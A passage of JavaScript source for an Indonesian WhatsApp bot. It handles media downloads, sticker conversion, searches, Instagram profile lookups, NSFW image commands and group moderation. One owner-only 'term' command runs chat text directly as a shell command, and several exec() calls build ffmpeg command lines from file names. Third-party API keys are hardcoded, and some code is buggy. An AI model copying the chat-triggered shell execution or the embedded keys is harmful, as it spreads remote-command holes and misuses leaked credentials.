							sendButLocation(from, donasibot() , `Jangan klik doang, donasi ya 🌝 ${enter}${enter}${botname}™© | By ${ownername}`,donas,  [{"buttonId": `qr_gopay1`,"buttonText": {"displayText": "QR GOPAY"},"type": "RESPONSE"},{"buttonId": `qr_dana1`,"buttonText": {"displayText": "QR DANA"},"type": "RESPONSE"},{"buttonId": `qr_ovo1`,"buttonText": {"displayText": "QR OVO"},"type": "RESPONSE"}], {})
							break
				case 'gcbot': case 'grupbot': case 'groupbot':
							let gcbot = await getBuffer('https://telegra.ph/file/09d4f9b77a0745f35bdfa.jpg')
							sendButLocation(from, gcbotwa() , `Jangan klik doang, join napa 〽️ ${enter}${enter}${botname}™© | By ${ownername}`,gcbot,  [{"buttonId": `sewabot`,"buttonText": {"displayText": "SEWABOT"},"type": "RESPONSE"}], {})
							break
				case 'infobot':
				let infobopot = await getBuffer('https://telegra.ph/file/06fad83011a4b1cecd4ba.jpg')
							sendButLocation(from, infobot(status, offline,latensii, totalchat, giid, wa_version, mcc, mnc, os_version, device_manufacturer, device_model, ownerNumberrr,runtime, kyun) , `${enter}${enter}${botname} 〽️ | By ${ownername}`,infobopot,  [{"buttonId": 'gcbot',"buttonText": {"displayText": "GROUP BOT"},"type": "RESPONSE"}], {contextInfo:{"mentionedJid": [ownerNumberrr]}})
							break
			case 'play2':
					if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
		            var srch = args.join('')
		    		aramas = await yts(srch);
		    		aramat = aramas.all 
		   			var mulaikah = aramat[0].url							
		                  try {
		                    yta(mulaikah)
		                    .then((res) => {
		                        const { dl_link, thumb, title, filesizeF, filesize } = res
		                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
		                        .then(async (a) => {
		                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
		                        const captions = `🎧 *PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
		                       await sendMediaURL(from, thumb, captions)
		                        sendMediaURL(from, dl_link).catch(() => reply('error'))
		                        })                
		                        })
		                        } catch (err) {
		                        reply(mess.error.api)
		                        }
		                   break  
		
		               case 'sticker':
					case 'stiker': case 's':
					
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await alpha.downloadAndSaveMediaMessage(encmedia)
							ran = getRandom('.webp')
                        await ffmpeg(`./${media}`)
                            .input(media)
                            .on('start', function (cmd) {
                                console.log(`Started : ${cmd}`)
                            })
                            .on('error', function (err) {
                                console.log(`Error : ${err}`)
                                fs.unlinkSync(media)
                                 })
                            .on('end', async function () {
                                console.log('Finish')
                                await alpha.sendMessage(from, fs.readFileSync(ran), sticker, { quoted: fgclink })
                                    fs.unlinkSync(media)
                                    fs.unlinkSync(ran)
                                })
                            .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                            .toFormat('webp')
                            .save(ran)
                    } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                        const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        const media = await alpha.downloadAndSaveMediaMessage(encmedia)
                        ran = getRandom('.webp')
                        await ffmpeg(`./${media}`)
                            .inputFormat(media.split('.')[1])
                            .on('start', function (cmd) {
                                console.log(`Started : ${cmd}`)
                            })
                            .on('error', function (err) {
                                console.log(`Error : ${err}`)
                                fs.unlinkSync(media)
                                tipe = media.endsWith('.mp4') ? 'video' : 'gif'
                                reply(`❌ Gagal, pada saat mengkonversi ${tipe} ke stiker`)
                            })
                            .on('end', async function () {
                                console.log('Finish')
                                await alpha.sendMessage(from, fs.readFileSync(ran), sticker, { quoted: fgclink })
                                    fs.unlinkSync(media)
                                    fs.unlinkSync(ran)
                                })
                            .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                            .toFormat('webp')
                            .save(ran)
                    } else if ((isMedia || isQuotedImage) && args[0] == 'nobg') {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        const media = await alpha.downloadAndSaveMediaMessage(encmedia)
                        ranw = getRandom('.webp')
                        ranp = getRandom('.png')
                        reply(mess.wait)
                        keyrmbg = 'bcAvZyjYAjKkp1cmK8ZgQvWH'
                        await removeBackgroundFromImageFile({ path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp }).then(res => {
                            fs.unlinkSync(media)
                            let bufferir9vn5 = Buffer.from(res.base64img, 'base64')
                            fs.writeFileSync(ranp, bufferir9vn5, (err) => {
                                if (err) return reply('Gagal, Terjadi kesalahan, silahkan coba beberapa saat lagi.')
                            })
                            exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
                                fs.unlinkSync(ranp)
                                if (err) return reply('emror bang')
                                alpha.sendMessage(from, fs.readFileSync(ranw), sticker, { quoted: mek })
                                    fs.unlinkSync(ranw)
                                })
                            })
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix}sticker atau tag gambar yang sudah dikirim\nDurasi sticker video 1-9 detik...`)
                    }
                    break
		    case 'toimg':
		if (!isQuotedSticker) return reply('Reply stc nya!')
					reply(lang.wait())
					encmediaa = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediaa = await alpha.downloadAndSaveMediaMessage(encmediaa)
					ran = getRandom('.png')
					exec(`ffmpeg -i ${mediaa} ${ran}`, (err) => {
					fs.unlinkSync(mediaa)
					if (err) return reply('Yah gagal, coba ulangi ^_^')
					buffer = fs.readFileSync(ran)
					fakethumb(buffer,'```Nih kak, jgn lupa Support YT : ZEEONE OFC```')
					fs.unlinkSync(ran)
					})
					break
			case 'ytsearch': case 'yts':
					if (args.length < 1) return reply('Tolong masukan query!')
					var srch = args.join(' ');
					try {
		        	var aramas = await yts(srch);
		   			} catch {
		        	return await alpha.sendMessage(from, 'Error!', MessageType.text, dload)
		    		}
		    		aramat = aramas.all 
		    		var tbuff = await getBuffer(aramat[0].image)
		    		var ytresult = '';
		    		ytresult += '「 *YOUTUBE SEARCH* 」'
		    		ytresult += '\n________________________\n\n'
		   			aramas.all.map((video) => {
		        	ytresult += '🐣 Title: ' + video.title + '\n'
		            ytresult += '🐤 Link: ' + video.url + '\n'
		            ytresult += '🦊 Durasi: ' + video.timestamp + '\n'
					ytresult += '🐺 Views: ' + video.views + '\n'
		            ytresult += '🦡 Upload: ' + video.ago + '\n________________________\n\n'
		    		});
		    		ytresult += '*WHATSAPP-BOT*'
		    		await fakethumb(tbuff,ytresult)
					break
			case 'setreply':
			case 'setfake':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (!q) return fakegroup(mess.wrongFormat)
					fake = q
					fakegroup(`Succes Mengganti Conversation Fake : ${q}`)
					break
			case 'setprefix':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
reply('Pke yg multi aja')
/*if (args.length < 1) return reply(`*Format Error!*\n\n*Example :*\n •${prefix + command} multi\n •${prefix + command} nopref\n •${prefix + command} #`)
if((args[0]) == 'multi'){
if(multi)return reply('_Sudah diaktifkan sebelumnya!_')
multi = true
nopref = false
single = false
reply(`_Succses mengganti Prefix ke Multiprefix!_`)
}else
if ((args[0]) == 'nopref'){
if(nopref)return reply('_Sudah diaktifkan sebelumnya!_')
multi = false
single = false
nopref = true
reply(`_Succses mengganti Prefix ke noprefix!_`)
}else
if((args[0]) == `${q}`){
multi = false
nopref = false
single = true
prefa = `${q}`
reply(`_Succses mengganti Prefix ke ${q}_`)
}*/
break
			case 'set_stc_menu':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			        if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_menu = q
					fakeitem(`Succes Mengganti stc cmd *MENU* : ${q}`)
					break
			case 'set_stc_ping':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_ping = q
					fakeitem(`Succes Mengganti stc cmd *PING* : ${q}`)
					break
			case 'set_stc_music':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_play_music = q
					fakeitem(`Succes Mengganti stc cmd *PlAY MUSIC* : ${q}`)
					break
			case 'set_stc_gclose':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_group_close = q
					fakeitem(`Succes Mengganti stc cmd *GROUP CLOSE* : ${q}`)
					break
			case 'set_stc_gopen':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_group_open = q
					fakeitem(`Succes Mengganti stc cmd *GROUP OPEN* : ${q}`)
					break
			case 'set_stc_itos':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_image_to_sticker = q
					fakeitem(`Succes Mengganti stc cmd *IMAGE TO. STICKER* : ${q}`)
					break
			case 'set_stc_to_image':
			case 'set_stc_toimg':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_to_image = q
					fakeitem(`Succes Mengganti stc cmd *STICKER TO IMAGE* : ${q}`)
					break
			case 'set_stc_self':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_self = q
					fakeitem(`Succes Mengganti stc cmd *SELF* : ${q}`)
					break
			case 'set_stc_public':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_public = q
					fakeitem(`Succes Mengganti stc cmd *PUBLIC* : ${q}`)
					break
			case 'setfakeimg':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		        	if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
		            boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					delb = await alpha.downloadMediaMessage(boij)
					fs.readFileSync(`./image/${thumbnail}`, delb)
					fakestatus('Sukses')
		        	} else {
		            fakeitem(`Kirim gambar dengan caption ${prefix}setfakeimg`)
		          	}
					break	
			case 'setthumb':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			        if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
		          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					delb = await alpha.downloadMediaMessage(boij)
					fs.readFileSync(`./image/${thumbnail}`, delb)
					fakestatus('Sukses')
		        	} else {
		            fakegroup(`Kirim gambar dengan caption ${prefix}sethumb`)
		          	}
					break	
			case 'image':
		            if (args.length < 1) return fakegroup('Masukan teks!')
		            const gimg = args.join('');
		            res = await gis(gimg, google)
		            function google(error, result){
              if (error){ return reply('Not found')}
              else {
					n = result
		            images = n[Math.floor(Math.random() * n.length)].url
		            alpha.sendMessage(from,images,image,{quoted:mek})
		            }}
		            break
		    
		    case 'brainly':
					if (args.length < 1) return reply('Pertanyaan apa')
		          	brien = args.join(' ')
					brainly(`${brien}`).then(res => {
					teks = '❉───────────────────────❉\n'
					for (let Y of res.data) {
					teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
					}
					alpha.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})                        
		            }).catch(e => {
					reply('Terjadi kesalahan, coba beberapa saat lagi')
					})             
					break
		
      
    case 'playstore':
            if(!q) return reply('lu nyari apa?')
            let play = await hx.playstore(q)
            let store = '❉─────────────────────❉\n'
            for (let i of play){
            store += `\n*「 *PLAY STORE* 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`
            }
            reply(store)
            break
		    case 'igstalk':
		       if (!q) return fakegroup('Usernamenya?')
		var halzmal = q
		            const tod = await fetchJson(`https://ferdiz-afk.my.id/api/stalkig?username=${halzmal}`);
var nih_buff = await getBuffer(tod.picurl);
const tt = `*INSTAGRAM STALK*

\nUsername: ${tod.username}\nFullname: ${tod.fullname}\npostingan: ${tod.post}\ncategory_akun: ${tod.category_name}\nverified: ${tod.verified_user}\nprivate: ${tod.private_user}\nFollowing: ${tod.following}\nFollower: ${tod.followers}\nBio:\n${tod.bio}`;
alpha.sendMessage(from, nih_buff, image, { quoted: mek, caption: tt });
break    
		    case 'fb':
            if (!q) return reply('Linknya?')
            if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(lang.erorLink())
            reply(lang.wait())
            te = args.join(' ')
            hx.fbdown(`${te}`)
            .then(G => {
            ten = `${G.HD}`
            sendMediaURL(from,ten,`*LINK VIDEO* : ${G.Normal_video}`)
            })
            break    
case 'linkwa':
case 'grupwa':
case 'groupwa':
case 'gcwa':
            if(!q) return reply('cari group apa?')
            hx.linkwa(q)
            .then(result => {
            let res = '「 *GC WA* 」\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break 
case 'lirik':
            if(!q) return reply('lagu apa?')
            let song = await hx.lirik(q)
            sendMediaURL(from,song.thumb,song.lirik)
            break
    case 'otaku':
            if(!q) return reply('judul animenya?')
            let anime = await hx.otakudesu(q)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ram = await getBuffer(anime.img)
            alpha.sendMessage(from,ram,image,{quoted:mek,caption:rem})
            break
    case 'komiku':
            if(!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`)
            let komik = await hx.komiku(q)
            result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
            sendMediaURL(from, komik.image,result)
            break  
			case 'term':
			
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (!q) return fakegroup(mess.wrongFormat)
					exec(q, (err, stdout) => {
					if (err) return fakegroup(`ALPHABOT:~ ${err}`)
					if (stdout) {
					fakegroup(stdout)
					}
					})
				    break 
		    case 'join':
		            if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            try {
		            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(lang.erorLink())
		            hen = args[0]
		            if (!q) return fakestatus('Masukan link group')
		            var codeInvite = hen.split('https://chat.whatsapp.com/')[1]
		            if (!codeInvite) return fakegroup ('pastikan link sudah benar!')
		            var response = await alpha.acceptInvite(codeInvite)
		            fakestatus('```SUKSES JOIN GRUP```')
		            } catch {
		            fakegroup('```LINK ERROR!```')
		            }
		            break
		    case 'twmp4': case 'twitter':
if (args.length < 1) return reply('Link?')
lin = args[0]
reply(lang.wait())
hx.twitter(lin).then(res => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
fto = fs.readFileSync(`./image/${thumbnail}`)
alpha.sendMessage(from, fto, image, {quoted:mek, caption:`*TWITTER MP4*${enter}${enter}•> Hd : ${res.HD}${enter}•> Sd : ${res.SD}${enter}•> Audio : ${res.audio}${enter}${enter}_Please wait, the media file is being sent it may take a few minutes_`, thumbnail: fs.readFileSync(`./image/${thumbnail}`), contextInfo:{forwardingScore: 989, isForwarded: true}})
sendMediaURL(from, Anu, 'Done!')
})
break
case 'twmp3':
if (args.length < 1) return reply('Link?')
lin = args[0]
reply(lang.wait())
hx.twitter(lin).then(async (res) => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
fto = fs.readFileSync(`./image/${thumbnail}`)
alpha.sendMessage(from, fto, image, {quoted:mek, caption:`*TWITTER MP3*${enter}${enter}•> Hd : ${res.HD}${enter}•> Sd : ${res.SD}${enter}•> Audio : ${res.audio}${enter}${enter}_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:fs.readFileSync(`./image/${thumbnail}`), contextInfo:{forwardingScore: 989, isForwarded: true}})
khs = await getBuffer(Anu)
alpha.sendMessage(from, khs, audio, {mimetype:'audio/mp4', filename:'alphagan.mp3', quoted:mek, ptt:true})
})
break
		    case 'runtime':
		    case 'test':
		            run = process.uptime() 
		            teks = `${kyun(run)}`
		            fakegroup(teks)
		            break  
			case 'speed':
			case 'ping':
			const timestamp = speed();
					const latensi = speed() - timestamp
					exec(`neofetch --stdout`, (error, stdout, stderr) => {
					const child = stdout.toString('utf-8')
					const teks = child.replace(/Memory:/, "Ram:")
					const pingnya = `\`\`\`${teks}Speed: ${latensi.toFixed(4)} Second\`\`\``
					fakegroup(pingnya)
					})
					break
               
		    case 'totag':
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, sticker, options)
		            fs.unlinkSync(file)
		            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
		            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, image, options)
		            fs.unlinkSync(file)
		        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
		            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                mimetype : 'audio/mp4',
		                ptt : true,
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, audio, options)
		            fs.unlinkSync(file)
		        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
		            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                mimetype : 'video/mp4',
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, video, options)
		            fs.unlinkSync(file)
		        } else{
		          fakegroup(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
		        }
		        break
		    case 'tomp4':
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            let owogi = await alpha.downloadAndSaveMediaMessage(ger)
		            webp2mp4File(owogi).then(res=>{
		            sendMediaURL(from,res.result,'Done')
		            })
		            }else {
		            fakegroup('reply stiker')
		            }
		            fs.unlinkSync(owgi)
		            break
		    case 'tourl':
		case 'imgtourl':{
                if ((isMedia && !mek.message.videoMessage || isQuotedImage ) && args.length == 0) {
                    var imgbb = require('imgbb-uploader')
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading image...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					reply(teks)
                    .catch((e)=>{reply(`\`\`\`[ x ]\`\`\`Eror! ada masalah dgn imgbb`)})
                } else {
                    reply(`Kirim gambar atau reply gambar dengan caption ${command}`)
                }
            }
		            
		           break
/*
]=====> NSFW MENU<=====[
*/

			case 'awoo':
					if (!isNsfw) return reply(lang.nsfwmo())
					reply(lang.wait())
					anu = await fetchJson(`https://waifu.pics/api/sfw/awoo`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					break
			case 'blowjob2':
					if (!isNsfw) return reply(lang.nsfwmo())
					reply(lang.wait())
					anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					break
			case 'megumin':
					if (!isNsfw) return reply(lang.nsfwmo())
					reply(lang.wait())
					anu = await fetchJson(`https://waifu.pics/api/sfw/megumin`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					break
			case 'trapnime':
					if (!isNsfw) return reply(lang.nsfwmo())
					reply(lang.wait())
					anu = await fetchJson(`https://waifu.pics/api/nsfw/trap`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					break

/*
]=====> GROUP MENU<=====[
*/
  
			case 'add':  
			if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
                    if (args.length < 1) return reply('Yang mau di add?')
					if (args[0].startsWith('08')) return reply('Gunakan kode negara mas')
					orang = args[0] + '@s.whatsapp.net'
response = await alpha.groupAdd(from, [orang])
o = response.participants[0]
let inv = (Object.values(o))
if(inv[0].code == 409) return reply('Orang yang anda add sudah ada didalam Group!')
else if(inv[0].code == 403){
alpha.sendMessage(from, `User private\n\nMengirim Undangan Group Ke @${q.split('@')[0]}`, MessageType.text, {quoted: mek, contextInfo: {mentionedJid: [orang]}})
alpha.sendMessage(from, orang, inv[0].invite_code, inv[0].invite_code_exp, groupMetadata.subject , `Salah Satu Admin Mengundang Anda Masuk Ke Sini Silahkan Klik Bergabung Untuk Masuk`)
}
					break 
					case 'radd': case 'addreply':
					if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply pesan yg ingin di Add!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
mentions(`Perintah di terima, Add: @${mentioned[0].split('@')[0]}`, mentioned, true)
alpha.groupAdd(from, mentioned)
break

case 'kick':
if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
if(!q)return reply(`*Format salah!*\n\n*Example : ${prefix + command} @tag*`)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
yau = q.split('@')[1] + '@s.whatsapp.net'
alpha.groupRemove(from, [yau])
reply(`Succses kick target!`)
break

case 'rkick': case 'kickreply':
if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply pesan yg ingin di Kick!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
mentions(`Perintah di terima, mengeluarkan : @${mentioned[0].split('@')[0]}`, mentioned, true)
alpha.groupRemove(from, mentioned)
break
			case 'antilink':
if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
              if (args[0] == 'on'){
              if (isAntiLink) return reply(lang.anjawaUdhOn(command))
              antilink.push(from)
              fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
              reply(lang.anjawaOn(command))
              } else if (args[0] == 'off'){
              let anu = antilink.indexOf(from)
              antilink.splice(anu, 1)
              fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
              reply(lang.anjawaOff(command))
              } else if (!q) {
          sendButMessage(from, `MODE ANTILINK`, `Choose one`, [
            {
              buttonId: 'antilink on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'antilink off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
       case 'event':
					if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if ( !isOwner && !isCreator && !mek.key.fromMe) return reply("Khusus admin");
					if (args[0] == "on") {
						if (isEventon) return reply(lang.anjawaUdhOn(command))
						event.push(from)
						fs.writeFileSync('./src/event.json', JSON.stringify(event))
						reply(lang.anjawaOn(command))
					} else if (args[0] == "off") {
						event.splice(from, 1)
						fs.writeFileSync('./src/event.json', JSON.stringify(event))
						reply(lang.anjawaOff(command))
					} else if (!q) {
          sendButMessage(from, `MODE EVENT`, `Choose one`, [
            {
              buttonId: 'event on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'event off',
              buttonText: {
                displayText: `Off`,
              },
